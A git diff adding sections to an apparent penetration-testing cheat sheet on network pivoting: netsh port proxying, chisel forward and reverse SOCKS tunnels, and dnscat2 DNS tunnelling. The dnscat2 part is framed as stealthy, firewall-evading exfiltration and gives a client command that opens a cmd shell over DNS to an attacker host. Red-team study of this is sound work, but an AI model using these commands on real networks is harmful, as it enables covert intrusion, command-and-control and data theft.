@@ -198,6 +198,28 @@ socat TCP4-LISTEN:<attacker port>,fork TCP4:<remote host>:<remote host port>
 
 <figure><img src="../.gitbook/assets/image (1790).png" alt=""><figcaption></figcaption></figure>
 
+### Using Netsh&#x20;
+
+#### Scenario
+
+<figure><img src="../.gitbook/assets/image (1798).png" alt=""><figcaption></figcaption></figure>
+
+{% code overflow="wrap" %}
+```cmd
+netsh.exe interface portproxy add v4tov4 listenport=2222 listenaddress=192.168.52.132 connectport=22 connectaddress=192.168.16.142
+```
+{% endcode %}
+
+<figure><img src="../.gitbook/assets/image (1796).png" alt=""><figcaption></figcaption></figure>
+
+#### Using it&#x20;
+
+<figure><img src="../.gitbook/assets/image (1797).png" alt=""><figcaption></figcaption></figure>
+
+{% hint style="info" %}
+_Be patient. Good things take time._&#x20;
+{% endhint %}
+
 ## Dynamic Port Forwarding&#x20;
 
 <figure><img src="../.gitbook/assets/image (1759).png" alt=""><figcaption></figcaption></figure>
@@ -247,6 +269,64 @@ _Install Proxifier Tool and add Proxy server from the Profile tab._&#x20;
 #### Using Tunnel&#x20;
 
 <figure><img src="../.gitbook/assets/image (1793).png" alt=""><figcaption></figcaption></figure>
+
+### Using chisel&#x20;
+
+**Start server on pivot host:**&#x20;
+
+{% code overflow="wrap" %}
+```bash
+./chisel server -v -p 1234 --socks5
+```
+{% endcode %}
+
+<figure><img src="../.gitbook/assets/image (1802).png" alt=""><figcaption></figcaption></figure>
+
+**Start client on attack box:**&#x20;
+
+{% code overflow="wrap" %}
+```bash
+./chisel client -v 192.168.52.131:1234 socks
+```
+{% endcode %}
+
+<figure><img src="../.gitbook/assets/image (1803).png" alt=""><figcaption></figcaption></figure>
+
+you can see it opens up a SOCKS proxy port on `1080`. Make sure you've configured proxychains to use it.&#x20;
+
+#### Using the tunnel&#x20;
+
+<figure><img src="../.gitbook/assets/image (1801).png" alt=""><figcaption></figcaption></figure>
+
+### Using chisel (Reverse Pivot)&#x20;
+
+{% hint style="info" %}
+_This is same as the last one. only thing is if firewall rules restrict inbound connections in pivot host to our compromised target we can use this option._&#x20;
+{% endhint %}
+
+**Start server on attack box:**&#x20;
+
+{% code overflow="wrap" %}
+```bash
+sudo ./chisel server --reverse -v -p 1234 --socks5
+```
+{% endcode %}
+
+<figure><img src="../.gitbook/assets/image (1804).png" alt=""><figcaption></figcaption></figure>
+
+**Start client on pivot host:**
+
+{% code overflow="wrap" %}
+```bash
+./chisel client -v 192.168.52.130:1234 R:socks
+```
+{% endcode %}
+
+<figure><img src="../.gitbook/assets/image (1805).png" alt=""><figcaption></figcaption></figure>
+
+#### Using the tunnel&#x20;
+
+<figure><img src="../.gitbook/assets/image (1806).png" alt=""><figcaption></figcaption></figure>
 
 ## Remote Port Forwarding&#x20;
 
@@ -300,3 +380,31 @@ socat TCP4-LISTEN:<local port>,fork TCP4:<attacker host>:<attacker port>
 
 [Go To Metasploit Framework](tools/metasploit-framework.md#maintaining-persistence)
 
+## Tunneling&#x20;
+
+### Using dnscat2
+
+**dnscat2** is a popular penetration testing and command-and-control (C2) tool designed to create an encrypted tunnel over the DNS (Domain Name System) protocol. Dnscat2 can be an extremely stealthy approach to exfiltrate data while evading firewall detections which strip the HTTPS connections and sniff the traffic.
+
+#### Attack Host&#x20;
+
+{% code overflow="wrap" %}
+```bash
+sudo ruby dnscat2.rb --dns host=192.168.52.130,port=53,domain=nexploit.local --no-cache
+```
+{% endcode %}
+
+_you can see in the image that traffic is encrypted within DNS._&#x20;
+
+<figure><img src="../.gitbook/assets/image (1799).png" alt=""><figcaption></figcaption></figure>
+
+#### Client&#x20;
+
+{% code overflow="wrap" %}
+```powershell
+Import-Module .\dnscat2.ps1
+Start-Dnscat2 -DNSserver 10.10.14.18 -Domain inlanefreight.local -PreSharedSecret 0ec04a91cd1e963f8c03ca499d589d21 -Exec cmd
+```
+{% endcode %}
+
+<figure><img src="../.gitbook/assets/image (1800).png" alt=""><figcaption></figcaption></figure>
